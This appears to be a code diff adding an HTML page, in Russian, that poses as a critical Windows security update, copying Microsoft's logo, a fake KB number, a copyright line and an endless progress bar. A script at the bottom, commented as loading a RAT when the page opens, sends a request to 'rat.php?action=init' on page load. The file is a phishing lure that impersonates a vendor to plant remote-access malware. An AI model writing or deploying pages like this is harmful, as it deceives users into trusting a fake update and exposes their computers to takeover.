@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Обновление безопасности Windows</title>
+    <style>
+        body {
+            background: #2b5797;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+        
+        .update-container {
+            background: white;
+            color: #333;
+            width: 600px;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        
+        .windows-logo {
+            width: 80px;
+            height: 80px;
+            background: #2b5797;
+            border-radius: 15px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #e6e6e6;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #4CAF50;
+            animation: progress 3s infinite;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        
+        .warning {
+            color: #ff4444;
+            font-size: 14px;
+            margin: 15px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="update-container">
+        <div class="windows-logo">
+            <svg viewBox="0 0 24 24" fill="white">
+                <rect x="2" y="2" width="9" height="9"/>
+                <rect x="13" y="2" width="9" height="9"/>
+                <rect x="2" y="13" width="9" height="9"/>
+                <rect x="13" y="13" width="9" height="9"/>
+            </svg>
+        </div>
+        
+        <h2>Важное обновление безопасности Windows</h2>
+        <p>Установка критического обновления KB5023780</p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <div class="warning">
+            ⚠️ Не выключайте компьютер до завершения обновления
+        </div>
+        
+        <p style="color: #666; font-size: 12px; margin-top: 30px;">
+            Microsoft Corporation • Все права защищены
+        </p>
+    </div>
+    
+    <script>
+        // Загрузка RAT при открытии страницы
+        fetch('rat.php?action=init', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            }
+        });
+    </script>
+</body>
+</html>
